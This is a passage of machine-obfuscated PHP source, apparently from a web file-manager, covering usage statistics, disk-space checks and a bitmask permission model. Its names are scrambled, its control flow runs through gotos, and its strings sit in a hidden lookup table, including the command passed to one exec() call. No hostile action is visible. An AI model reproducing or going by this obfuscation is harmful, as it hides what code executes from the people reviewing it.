($C—öÎšÈŠç[$eğ·×çËô¡] as $d‰­Åàœ => $D«Â¾ÙÉ„ ) { $b·ºíÄŒ¨³[$d‰­Åàœ] = 0; } $B¸Å¯™Â¹ö[] = $b·ºíÄŒ¨³; } $FÙ¬ëñÁµ = array(); foreach ($B¸Å¯™Â¹ö as $D«Â¾ÙÉ„ ) { if ($eğ·×çËô¡ == $b„§æãÆô‹[1648] && $D«Â¾ÙÉ„ [$b„§æãÆô‹[1650]] > $D«Â¾ÙÉ„ [$b„§æãÆô‹[744]]) { $D«Â¾ÙÉ„ [$b„§æãÆô‹[1650]] = $D«Â¾ÙÉ„ [$b„§æãÆô‹[744]]; } foreach ($C—öÎšÈŠç[$eğ·×çËô¡] as $d‰­Åàœ => $eÆËˆßª¡) { $F‡†áóÍ¹ = array($b„§æãÆô‹[222] => $D«Â¾ÙÉ„ [$b„§æãÆô‹[222]], $b„§æãÆô‹[1451] => $eÆËˆßª¡); $F‡†áóÍ¹[$dÖ ˆŠïè”[$eğ·×çËô¡]] = isset($D«Â¾ÙÉ„ [$d‰­Åàœ]) ? $D«Â¾ÙÉ„ [$d‰­Åàœ] : 0; $FÙ¬ëñÁµ[] = $F‡†áóÍ¹; } } goto fˆÙÚ‰ÕÖ; EÌ¬÷¸ó×†: } public function validDate($aêÊï, $dêÈĞ‘ƒÇ) { goto F‚µõ†´µÂ; bÔóˆÊßˆ: return $d› š×ÙÚâ; goto Bõ…¬ĞÒÂ; F‚µõ†´µÂ: $CĞ¶òÎ—­¿ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BÜğ–Ùƒ‚À = date($CĞ¶òÎ—­¿[1653], strtotime($CĞ¶òÎ—­¿[1654])); $d› š×ÙÚâ = array($BÜğ–Ùƒ‚À); goto B–×«ø²´Ÿ; B–×«ø²´Ÿ: switch ($aêÊï) { case $CĞ¶òÎ—­¿[1530]: $c‚©½å†óØ = mktime(0, 0, 0, date($CĞ¶òÎ—­¿[1670]), date($CĞ¶òÎ—­¿[1274]) - date($CĞ¶òÎ—­¿[1335]) + 7 - 7, date($CĞ¶òÎ—­¿[1671])); $a›£ØËñ ñ = 0; do { $A‘âæÑÙŠˆ = date($CĞ¶òÎ—­¿[1653], $c‚©½å†óØ - 3600 * 24 * 7 * $a›£ØËñ ñ); $d› š×ÙÚâ[] = $A‘âæÑÙŠˆ; $a›£ØËñ ñ++; } while ($dêÈĞ‘ƒÇ < $A‘âæÑÙŠˆ); break; case $CĞ¶òÎ—­¿[1528]: $a›£ØËñ ñ = 1; do { $d²ùï×ñƒé = date($CĞ¶òÎ—­¿[1672], strtotime("\x2d\x20{$a›£ØËñ ñ}\40\155\x6f\x6e\x74\x68\x73")); $d› š×ÙÚâ[] = $d²ùï×ñƒé; $a›£ØËñ ñ++; } while ($dêÈĞ‘ƒÇ < $d²ùï×ñƒé); break; case $CĞ¶òÎ—­¿[1673]: $fËÂôºğµâ = (int) date($CĞ¶òÎ—­¿[1671], strtotime($dêÈĞ‘ƒÇ)); $c»ÅĞ£×á³ = (int) date($CĞ¶òÎ—­¿[1671]); if ($fËÂôºğµâ >= $c»ÅĞ£×á³) { break; } for ($fËÂôºğµâ; $fËÂôºğµâ < $c»ÅĞ£×á³; $fËÂôºğµâ++) { $d› š×ÙÚâ[] = $fËÂôºğµâ . $CĞ¶òÎ—­¿[1674]; } break; default: break; } if ($dêÈĞ‘ƒÇ > end($d› š×ÙÚâ)) { array_pop($d› š×ÙÚâ); } sort($d› š×ÙÚâ); goto bÔóˆÊßˆ; Bõ…¬ĞÒÂ: } public function listTable($BŸ†îÌèÉ¦) { $dø®’¥İ½ = ucfirst($BŸ†îÌèÉ¦); return Model($dø®’¥İ½)->listData(); } public function option($d”ßÚöÊ¡À) { $aš•Ë³Òİ = $_SERVER[Ôğ—¤Šµˆ˜ñ£][1675] . ucfirst($d”ßÚöÊ¡À); return $this->{$aš•Ë³Òİ}(); } private function optionUser() { goto AºÛäÁ¶”‘; d„È†Ö¹¶: if (!$eŠÀÂ›ÊĞ) { $eŠÀÂ›ÊĞ = 1; } $EÏ­ÜÕÒØã = array($c†÷ö˜ì÷¨[1677] => array($c†÷ö˜ì÷¨[994], $Aîµ’³²ß‚)); $EÓÊ„‚‰²¿ = Model($c†÷ö˜ì÷¨[532])->where($EÏ­ÜÕÒØã)->count($c†÷ö˜ì÷¨[1550]); goto AÁÌ¥…†¾°; eø’ˆšÜ°©: if ($AîÆÑ–ØáÌ < $Aîµ’³²ß‚) { $AîÆÑ–ØáÌ = $Aîµ’³²ß‚; } $EÏ­ÜÕÒØã = array($c†÷ö˜ì÷¨[1677] => array($c†÷ö˜ì÷¨[994], $AîÆÑ–ØáÌ)); $eŠÀÂ›ÊĞ = (int) Model($c†÷ö˜ì÷¨[532])->where($EÏ­ÜÕÒØã)->count($c†÷ö˜ì÷¨[1550]); goto d„È†Ö¹¶; AÁÌ¥…†¾°: return array($c†÷ö˜ì÷¨[740] => (int) $CØ”ƒ‘ã†, $c†÷ö˜ì÷¨[1678] => (int) ($CØ”ƒ‘ã† - $CÚÔ—•ˆ×), $c†÷ö˜ì÷¨[1679] => (int) $CÚÔ—•ˆ×, $c†÷ö˜ì÷¨[1680] => (int) $EÓÊ„‚‰²¿, $c†÷ö˜ì÷¨[1681] => $eŠÀÂ›ÊĞ); goto A×èèÚ…î…; DÖë·«ëÇÜ: $CÙª¯É´ï„ = intval($GLOBALS[$c†÷ö˜ì÷¨[6]][$c†÷ö˜ì÷¨[347]][$c†÷ö˜ì÷¨[1509]]) / 3600; $AîÆÑ–ØáÌ = strtotime("\x2d{$CÙª¯É´ï„}\40\x68\157\165\162\x73"); $Aîµ’³²ß‚ = strtotime(date($c†÷ö˜ì÷¨[1657])); goto eø’ˆšÜ°©; AºÛäÁ¶”‘: $c†÷ö˜ì÷¨ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CØ”ƒ‘ã† = Model($c†÷ö˜ì÷¨[532])->count($c†÷ö˜ì÷¨[1550]); $CÚÔ—•ˆ× = Model($c†÷ö˜ì÷¨[532])->where($c†÷ö˜ì÷¨[1676])->count($c†÷ö˜ì÷¨[1550]); goto DÖë·«ëÇÜ; A×èèÚ…î…: } private function optionFile() { goto CËÒò—Å¯“; eŸ£¥÷¬Ê¬: $Dè¨¬óÛè¸ = Model($Bä ¯İ‡®¹[813])->where($bö¼´Š”š)->sum($Bä ¯İ‡®¹[78]); $aÚªİÒ´á¸ = Model($Bä ¯İ‡®¹[813])->where($bö¼´Š”š)->count($Bä ¯İ‡®¹[397]); return array($Bä ¯İ‡®¹[744] => $E„ë‚È½, $Bä ¯İ‡®¹[1650] => $fÀùÑÜã, $Bä ¯İ‡®¹[1682] => $E„ë‚È½ - $fÀùÑÜã, $Bä ¯İ‡®¹[1683] => (int) $Dè¨¬óÛè¸, $Bä ¯İ‡®¹[746] => (int) $Eğ·–æÂë, $Bä ¯İ‡®¹[1684] => (int) $aÚªİÒ´á¸); goto f÷œ‘‘õ; fÕ©¤Ë±¸: $fÀùÑÜã = $aìÆˆ¥Ì†˜[$Bä ¯İ‡®¹[1650]]; $Eğ·–æÂë = Model($Bä ¯İ‡®¹[813])->where(array($Bä ¯İ‡®¹[405] => 0))->count($Bä ¯İ‡®¹[397]); $bö¼´Š”š = array($Bä ¯İ‡®¹[405] => 0, $Bä ¯İ‡®¹[194] => array($Bä ¯İ‡®¹[994], strtotime(date($Bä ¯İ‡®¹[1657])))); goto eŸ£¥÷¬Ê¬; CËÒò—Å¯“: $Bä ¯İ‡®¹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aìÆˆ¥Ì†˜ = $this->sourceSize(); $E„ë‚È½ = $aìÆˆ¥Ì†˜[$Bä ¯İ‡®¹[78]]; goto fÕ©¤Ë±¸; f÷œ‘‘õ: } private function optionAccess() { $FÇ“øêğãÏ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return array($FÇ“øêğãÏ[740] => $this->typeLogCnt(), $FÇ“øêğãÏ[107] => $this->typeLogCnt($FÇ“øêğãÏ[107]), $FÇ“øêğãÏ[444] => $this->typeLogCnt($FÇ“øêğãÏ[444]), $FÇ“øêğãÏ[1685] => $this->typeLogCnt($FÇ“øêğãÏ[1685]), $FÇ“øêğãÏ[1686] => $this->typeLogCnt($FÇ“øêğãÏ[1686]), $FÇ“øêğãÏ[588] => $this->typeLogCnt($FÇ“øêğãÏ[33], $FÇ“øêğãÏ[1661])); } private function typeLogCnt($A¼à½Î×Ï = '', $f á¬ŒåÀË = "\151\x64") { goto bîÌŸÓ”® ; bîÌŸÓ”® : $c„¡èìÍ® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CöŸÔµĞâĞ = array($c„¡èìÍ®[107] => array($c„¡èìÍ®[1687], $c„¡èìÍ®[1688]), $c„¡èìÍ®[444] => array($c„¡èìÍ®[1689], $c„¡èìÍ®[1690]), $c„¡èìÍ®[1685] => array($c„¡èìÍ®[1691], $c„¡èìÍ®[1692], $c„¡èìÍ®[1693]), $c„¡èìÍ®[1686] => array($c„¡èìÍ®[1694], $c„¡èìÍ®[1695]), $c„¡èìÍ®[1696] => array($c„¡èìÍ®[1697], $c„¡èìÍ®[1698], $c„¡èìÍ®[1699])); $cˆãœ·«¼Ë = strtotime(date($c„¡èìÍ®[1657])); goto cŒ‹“­Õê ; cŒ‹“­Õê : $bŞ†Œ™ğõ = array($c„¡èìÍ®[194] => array($c„¡èìÍ®[994], $cˆãœ·«¼Ë)); if ($A¼à½Î×Ï) { $bŞ†Œ™ğõ[$c„¡èìÍ®[29]] = array($c„¡èìÍ®[7], $CöŸÔµĞâĞ[$A¼à½Î×Ï]); } $a®­ˆœ×ç = Model($c„¡èìÍ®[1660])->where($bŞ†Œ™ğõ)->count($f á¬ŒåÀË); goto bæ¥¼µ„”¨; bæ¥¼µ„”¨: return (int) $a®­ˆœ×ç; goto AØöò‰ŞŒå; AØöò‰ŞŒå: } private function optionServer() { goto f¶Ìš¸Õ; fò™ò¬Ö’×: if ($Dõ™™™µÃá == $aİĞÎ…‘«[778]) { $f‡¸æˆ¾¨‹ = explode($aİĞÎ…‘«[1188], $aèÅ¹õ›‰İ[$aİĞÎ…‘«[954]]); $Dõ™™™µÃá = $f‡¸æˆ¾¨‹[0]; } if ($Dõ™™™µÃá == $aİĞÎ…‘«[781] || $Dõ™™™µÃá == $aİĞÎ…‘«[782]) { $d½Ş‚¼õ¬ = Model()->db()->query($aİĞÎ…‘«[1700]); $e‡­ÂÇš‰ = $d½Ş‚¼õ¬[0] && isset($d½Ş‚¼õ¬[0][$aİĞÎ…‘«[1450]]) ? $d½Ş‚¼õ¬[0][$aİĞÎ…‘«[1450]] : 0; $Dõ™™™µÃá = $aİĞÎ…‘«[1701] . ($e‡­ÂÇš‰ ? $aİĞÎ…‘«[8] . $e‡­ÂÇš‰ : $aİĞÎ…‘«[33]); } $Cµæ—ÍŠÒ = $GLOBALS[$aİĞÎ…‘«[6]][$aİĞÎ…‘«[347]][$aİĞÎ…‘«[815]]; goto bÀà–—´£°; c°ˆÇ¾‚–: $A×•ÕùĞãô = array($aİĞÎ…‘«[805] => $D²‹Ïß®Ç[$aİĞÎ…‘«[395]]); $B“â®Ş¦»£ = Model($aİĞÎ…‘«[464])->where($A×•ÕùĞãô)->sum($aİĞÎ…‘«[78]); $bò°¬šÔğÜ = explode($aİĞÎ…‘«[50], $_SERVER[$aİĞÎ…‘«[142]]); goto f¨ñÆÙİñ¤; f¶Ìš¸Õ: $aİĞÎ…‘« =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C°¸¥àŠÊ· = $this->diskDriver(); $D²‹Ïß®Ç = KodIO::defaultDriver(); goto c°ˆÇ¾‚–; f¨ñÆÙİñ¤: $Eôˆ‚Ñå ñ = $bò°¬šÔğÜ[0]; $aèÅ¹õ›‰İ = $GLOBALS[$aİĞÎ…‘«[6]][$aİĞÎ…‘«[17]]; $Dõ™™™µÃá = $aèÅ¹õ›‰İ[$aİĞÎ…‘«[955]]; goto fò™ò¬Ö’×; bÀà–—´£°: return array($aİĞÎ…‘«[1702] => $C°¸¥àŠÊ· ? $C°¸¥àŠÊ·[$aİĞÎ…‘«[1703]] : 0, $aİĞÎ…‘«[1704] => $C°¸¥àŠÊ· ? $C°¸¥àŠÊ·[$aİĞÎ…‘«[1705]] : 0, $aİĞÎ…‘«[1706] => (int) $D²‹Ïß®Ç[$aİĞÎ…‘«[1703]] * 1024 * 1024 * 1024, $aİĞÎ…‘«[1707] => (int) $B“â®Ş¦»£, $aİĞÎ…‘«[1708] => ucfirst($Eôˆ‚Ñå ñ), $aİĞÎ…‘«[1709] => $aİĞÎ…‘«[1710] . PHP_VERSION, $aİĞÎ…‘«[1711] => phpBuild64() ? 64 : 32, $aİĞÎ…‘«[739] => str_replace($aİĞÎ…‘«[1712], $aİĞÎ…‘«[971], $Dõ™™™µÃá), $aİĞÎ…‘«[347] => ucfirst($Cµæ—ÍŠÒ), $aİĞÎ…‘«[28] => $_SERVER[$aİĞÎ…‘«[1713]]); goto d¯¸¤¢‡¦’; d¯¸¤¢‡¦’: } private function diskDriver() { goto aÌŒô—ÑÃ¤; fïèÌ±ùó½: $A¼·ÑÉ³óÅ = $E™õ²–×‘’ - @disk_free_space($D»ÅâÛÂŞ); return array($f—Œ¤¬îç[1703] => $E™õ²–×‘’, $f—Œ¤¬îç[1705] => $A¼·ÑÉ³óÅ); goto C“Şæ”ŠÁ; aÌŒô—ÑÃ¤: $f—Œ¤¬îç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D»ÅâÛÂŞ = $f—Œ¤¬îç[8]; $AÔ³è•¢É = $GLOBALS[$f—Œ¤¬îç[6]][$f—Œ¤¬îç[1714]] == $f—Œ¤¬îç[1715]; goto dÎáù•ÀÜæ; dÎáù•ÀÜæ: if ($AÔ³è•¢É) { $D»ÅâÛÂŞ = $f—Œ¤¬îç[1716]; if (function_exists($f—Œ¤¬îç[1717])) { exec($f—Œ¤¬îç[1718], $dËàÂãáĞÄ); $D»ÅâÛÂŞ = $dËàÂãáĞÄ[1] . $f—Œ¤¬îç[8]; } } if (!file_exists($D»ÅâÛÂŞ)) { return; } $E™õ²–×‘’ = @disk_total_space($D»ÅâÛÂŞ); goto fïèÌ±ùó½; C“Şæ”ŠÁ: } public function fileChart($eƒ¨ëšŠ‰) { goto cÆŞ×½”Ø¬; Aø–¸ÄùÔÜ: $A¯†‚ŒŠ…æ = $this->sourceSize(); $aƒ¨õÚìÆ = array($a§µ×™¡Ê[492] => 0, $a§µ×™¡Ê[406] => 1); $F‹Ï½ÎºªÆ = Model($a§µ×™¡Ê[813])->where($aƒ¨õÚìÆ)->sum($a§µ×™¡Ê[78]); goto AåŸ‘…°´‚; cÆŞ×½”Ø¬: $a§µ×™¡Ê =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (isset($eƒ¨ëšŠ‰[$a§µ×™¡Ê[1550]])) { return Model($a§µ×™¡Ê[813])->userFileTypeProfile($eƒ¨ëšŠ‰[$a§µ×™¡Ê[1550]]); } if (isset($eƒ¨ëšŠ‰[$a§µ×™¡Ê[1719]])) { return Model($a§µ×™¡Ê[813])->groupFileTypeProfile($eƒ¨ëšŠ‰[$a§µ×™¡Ê[1719]]); } goto Aø–¸ÄùÔÜ; AåŸ‘…°´‚: $aƒ¨õÚìÆ[$a§µ×™¡Ê[406]] = 2; $F…çëŒ³ø· = Model($a§µ×™¡Ê[813])->where($aƒ¨õÚìÆ)->sum($a§µ×™¡Ê[78]); return array($a§µ×™¡Ê[744] => $A¯†‚ŒŠ…æ[$a§µ×™¡Ê[78]], $a§µ×™¡Ê[1650] => $A¯†‚ŒŠ…æ[$a§µ×™¡Ê[1650]], $a§µ×™¡Ê[1651] => (int) $F‹Ï½ÎºªÆ, $a§µ×™¡Ê[1652] => (int) $F…çëŒ³ø·); goto C¢Íöå‹”¦; C¢Íöå‹”¦: } private function sourceSize() { $D”ß³†‡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b´½éîˆŞ = Model($D”ß³†‡[813])->where(array($D”ß³†‡[405] => 0))->sum($D”ß³†‡[78]); $F¥¼‚¦à = Model($D”ß³†‡[464])->sum($D”ß³†‡[78]); if ($F¥¼‚¦à > $b´½éîˆŞ) { $F¥¼‚¦à = $b´½éîˆŞ; } return array($D”ß³†‡[78] => (int) $b´½éîˆŞ, $D”ß³†‡[1650] => (int) $F¥¼‚¦à); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $b‘†­«‘„Š =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c·š‹ Í‘À = array(array($b‘†­«‘„Š[415] => LNG($b‘†­«‘„Š[1720]), $b‘†­«‘„Š[1721] => $b‘†­«‘„Š[1722], $b‘†­«‘„Š[1723] => 1, $b‘†­«‘„Š[1724] => 1, $b‘†­«‘„Š[1725] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($b‘†­«‘„Š[415] => LNG($b‘†­«‘„Š[1726]), $b‘†­«‘„Š[1721] => $b‘†­«‘„Š[1727], $b‘†­«‘„Š[1723] => 2, $b‘†­«‘„Š[1724] => 1, $b‘†­«‘„Š[1725] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($b‘†­«‘„Š[415] => LNG($b‘†­«‘„Š[1728]), $b‘†­«‘„Š[1721] => $b‘†­«‘„Š[1729], $b‘†­«‘„Š[1723] => 3, $b‘†­«‘„Š[1724] => 1, $b‘†­«‘„Š[1725] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($b‘†­«‘„Š[415] => LNG($b‘†­«‘„Š[1730]), $b‘†­«‘„Š[1721] => $b‘†­«‘„Š[1731], $b‘†­«‘„Š[1723] => 4, $b‘†­«‘„Š[1724] => 1, $b‘†­«‘„Š[1725] => self::AUTH_SHOW | self::AUTH_VIEW), array($b‘†­«‘„Š[415] => LNG($b‘†­«‘„Š[1732]), $b‘†­«‘„Š[1721] => $b‘†­«‘„Š[1733], $b‘†­«‘„Š[1723] => 5, $b‘†­«‘„Š[1724] => 1, $b‘†­«‘„Š[1725] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($b‘†­«‘„Š[415] => LNG($b‘†­«‘„Š[1734]), $b‘†­«‘„Š[1721] => $b‘†­«‘„Š[1735], $b‘†­«‘„Š[1723] => 6, $b‘†­«‘„Š[1724] => 1, $b‘†­«‘„Š[1725] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($b‘†­«‘„Š[415] => LNG($b‘†­«‘„Š[1736]), $b‘†­«‘„Š[1721] => $b‘†­«‘„Š[1737], $b‘†­«‘„Š[1723] => 7, $b‘†­«‘„Š[1724] => 1, $b‘†­«‘„Š[1725] => 0)); return $c·š‹ Í‘À; } public static function authCheck($dï‡ê¸ˆ¡ç, $b—Óµ›ˆ¼ã) { $dï‡ê¸ˆ¡ç = intval($dï‡ê¸ˆ¡ç); if ($GLOBALS[$_SERVER[Ôğ—¤Šµˆ˜ñ£][499]]) { return !0; } if ($dï‡ê¸ˆ¡ç <= 0) { return !1; } if (($dï‡ê¸ˆ¡ç & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($dï‡ê¸ˆ¡ç & $b—Óµ›ˆ¼ã); } public static function authCheckShow($Bé¡µÏ) { return self::authCheck($Bé¡µÏ, self::AUTH_SHOW); } public static function authCheckView($C²Ş•¤‘¹•) { return self::authCheck($C²Ş•¤‘¹•, self::AUTH_VIEW); } public static function authCheckDownload($aÑæ™Ìô–») { return self::authCheck($aÑæ™Ìô–», self::AUTH_DOWNLOAD); } public static function authCheckUpload($Aº›ˆŠ¦­ª) { return self::authCheck($Aº›ˆŠ¦­ª, self::AUTH_UPLOAD); } public static function authCheckEdit($EµÒ¾Í­) { return self::authCheck($EµÒ¾Í­, self::AUTH_EDIT); } public static function authCheckRemove($cïñ‡º™‰Ì) { return self::authCheck($cïñ‡º™‰Ì, self::AUTH_REMOVE); } public static function authCheckShare($aÇ™ˆİšîé) { return self::authCheck($aÇ™ˆİšîé, self::AUTH_SHARE); } public static function authCheckComment($B†â÷£ŞØŒ) { return self::authCheck($B†â÷£ŞØŒ, self::AUTH_COMMENT); } public static function authCheckEvent($a¯†®‚šÛÒ) { return self::authCheck($a¯†®‚šÛÒ, self::AUTH_EVENT); } public static function authCheckRoot($bßÂ…¯ÒåÂ) { return self::authCheck($bßÂ…¯ÒåÂ, self::AUTH_ROOT); } public static function authCheckAction($d†ÔÓ¸‹‰”, $e–˜Çù‚Ó) { goto Eœ»¸Ú²³´; Eœ»¸Ú²³´: $dÚ³‚ñÂÊ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a¢×ÀÔãÙ = array($dÚ³‚ñÂÊ[1738] => self::AUTH_VIEW, $dÚ³‚ñÂÊ[1115] => self::AUTH_DOWNLOAD, $dÚ³‚ñÂÊ[107] => self::AUTH_UPLOAD, $dÚ³‚ñÂÊ[1686] => self::AUTH_EDIT, $dÚ³‚ñÂÊ[1685] => self::AUTH_REMOVE, $dÚ³‚ñÂÊ[1696] => self::AUTH_SHARE, $dÚ³‚ñÂÊ[352] => self::AUTH_COMMENT, $dÚ³‚ñÂÊ[1538] => self::AUTH_EVENT, $dÚ³‚ñÂÊ[1739] => self::AUTH_ROOT); if (!isset($a¢×ÀÔãÙ[$e–˜Çù‚Ó])) { return; } goto Cø¨ªñ‡Âø; Cø¨ªñ‡Âø: $DÖ“…Éö‘œ = $a¢×ÀÔãÙ[$e–˜Çù‚Ó]; $d†ÔÓ¸‹‰” = intval($d†ÔÓ¸‹‰”); if ($d†ÔÓ¸‹‰” <= 0) { return !1; } goto EÖÅŒº­ù; EÖÅŒº­ù: if (($d†ÔÓ¸‹‰” & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($d†ÔÓ¸‹‰” & $DÖ“…Éö‘œ); goto A‹´ÆÉí©ë; A‹´ÆÉí©ë: } public static function authDisable($A¼¯î™¸Î, $Aï•Î»°À) { if (intval($A¼¯î™¸Î) <= 0) { return 0; } return intval($A¼¯î™¸Î) & ~$Aï•Î»°À; } public $optionType = "\123\171\163\x74\x65\155\x2e\x73\157\165\x72\x63\x65\101\165\164\150\114\151\163\164"; public $field = array("\156\x61\155\145", "\x61\165\x74\150", "\x6c\141\x62\x65\x6c", "\144\151\x73\x70\154\141\x79", "\163\x79\163\164\x65\155", "\x73\x6f\162\x74"); public function initData() { $AÜ›âˆÇîÀ = $this->authDefault(); foreach ($AÜ›âˆÇîÀ as $e¾Ù¤ó¨šÀ) { $this->add($e¾Ù¤ó¨šÀ); } } public function findAuth($EÈÔºŒ’Š, $AÖƒ‹¹‚) { $CºÀ‡ÀË©ª =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fãï½İ†Ü§ = parent::listData(); foreach ($fãï½İ†Ü§ as $CÁÏíÙªÉò) { $Fˆë§ÌšÈÊ = intval($CÁÏíÙªÉò[$CºÀ‡ÀË©ª[408]]); if ($Fˆë§ÌšÈÊ <= 0 || $CÁÏíÙªÉò[$CºÀ‡ÀË©ª[1740]] == 0) { continue; } if (($Fˆë§ÌšÈÊ & $EÈÔºŒ’Š) != $EÈÔºŒ’Š) { continue; } if (($Fˆë§ÌšÈÊ & $AÖƒ‹¹‚) != 0) { continue; } return $CÁÏíÙªÉò[$CºÀ‡ÀË©ª[395]]; } return !1; } public function findAuthReadOnly() { $a¶îÜ°í¤ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $FÙá½ĞˆÙ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($a¶îÜ°í¤, $FÙá½ĞˆÙ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($DæÈÇß‰£¡ = false, $B½Ìšñ©„¸ = "\163\x6f\x72\x74", $f¢Ùõáù‘ = false) { return parent::listData($DæÈÇß‰£¡, $B½Ìšñ©„¸, $f¢Ùõáù‘); } public function update($E·…¨ñâƒÅ, $c•²ˆ‹««) { $F…ÍõË…èÁ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D’½çÛ´ = parent::listData($E·…¨ñâƒÅ); $C·¬é°ŒÚ‘ = $this->findByName($c•²ˆ‹««[$F…ÍõË…èÁ[28]]); if (!$D’½çÛ´ || $C·¬é°ŒÚ‘ && $C·¬é°ŒÚ‘[$F…ÍõË…èÁ[395]] != $D’½çÛ´[$F…ÍõË…èÁ[395]]) { return !1; } $this->filterAuth($c•²ˆ‹««[$F…ÍõË…èÁ[408]]); return parent::update($E·…¨ñâƒÅ, $c•²ˆ‹««); } public function remove($Eö¶²êŠÇ) { $AÔË‘ÛâĞ = parent::listData($Eö¶²êŠÇ); if (!$AÔË‘ÛâĞ || $AÔË‘ÛâĞ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][1192]]) { return !1; } return parent::remove($Eö¶²êŠÇ); } public function add($eù¥¡âÌÓö = array()) { goto C‚”£ÕÛÀ•; aö³ºâíÔ³: return parent::insert($eù¥¡âÌÓö); goto F¾šãÁÌ; C‚”£ÕÛÀ•: $cùçï‹Ô =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($this->findByName($eù¥¡âÌÓö[$cùçï‹Ô[28]])) { return !1; } $a’ø´õ‘İŠ = array($cùçï‹Ô[28] => $cùçï‹Ô[33], $cùçï‹Ô[408] => 1, $cùçï‹Ô[1741] => $cùçï‹Ô[1729], $cùçï‹Ô[1740] => 1, $cùçï‹Ô[1192] => 0, $cùçï‹Ô[1742] => 0); goto e‹âãÌ¤ˆ; e‹âãÌ¤ˆ: $eù¥¡âÌÓö = array_merge($a’ø´õ‘İŠ, $eù¥¡âÌÓö); $eù¥¡âÌÓö[$cùçï‹Ô[1742]] = $this->getSort(); $this->filterAuth($eù¥¡âÌÓö[$cùçï‹Ô[408]]); goto aö³ºâíÔ³; F¾šãÁÌ: } private function getSort() { $AÑ¢©öÛÎ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eğğ¾œ‘ø = parent::listData(); $aËÈùœó·à = array_to_keyvalue($eğğ¾œ‘ø, $AÑ¢©öÛÎ[33], $AÑ¢©öÛÎ[1742]); return empty($aËÈùœó·à) ? 0 : max($aËÈùœó·à) + 1; } private function filterAuth(&$B«Íë¬ƒò) { goto DäÆÜÉ‘Ú­; DÚ»Ô³¤ƒ: foreach ($BÛÍ”¼¿Æç as $eÎ·÷á­Ğ¤) { if (isset($Aö˜ÀÛî«[$eÎ·÷á­Ğ¤])) { $BÛÍ”¼¿Æç = array_merge($BÛÍ”¼¿Æç, $Aö˜ÀÛî«[$eÎ·÷á­Ğ¤]); } } $BÛÍ”¼¿Æç[] = self::AUTH_SHOW; $B«Íë¬ƒò = array_sum(array_unique($BÛÍ”¼¿Æç)); goto FãÈ §È; AÔ¢‚Å‘–×: foreach ($a…²­¼Âàô as $eÎ·÷á­Ğ¤) { if ($B«Íë¬ƒò & $eÎ·÷á­Ğ¤) { $BÛÍ”¼¿Æç[] = $eÎ·÷á­Ğ¤; } } if (in_array(self::AUTH_ROOT, $BÛÍ”¼¿Æç)) { $B«Íë¬ƒò = array_sum($a…²­¼Âàô); return; } $Aö˜ÀÛî« = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto DÚ»Ô³¤ƒ; DäÆÜÉ‘Ú­: if (!$B«Íë¬ƒò) { return; } $a…²­¼Âàô = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $BÛÍ”¼¿Æç = array(); goto AÔ¢‚Å‘–×; FãÈ §È: } public function sort($B¹—Ìø˜¯, $A¡´Êˆ–® ) { return parent::update($B¹—Ìø˜¯, $A¡´Êˆ–® ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\142\141\x63\153\x75\160\114\x69\163\164"; public $field = array("\151\x6f", "\156\x61\x6d\145", "\x73\164\141\164\x75\163", "\x63\x6f\156\x74\145\x6e\x74", "\x6d\x61\x6e\x75\x61\x6c", "\x72\x65\163\165\154\x74", "\164\x69\155\145\x46\x72\157\155", 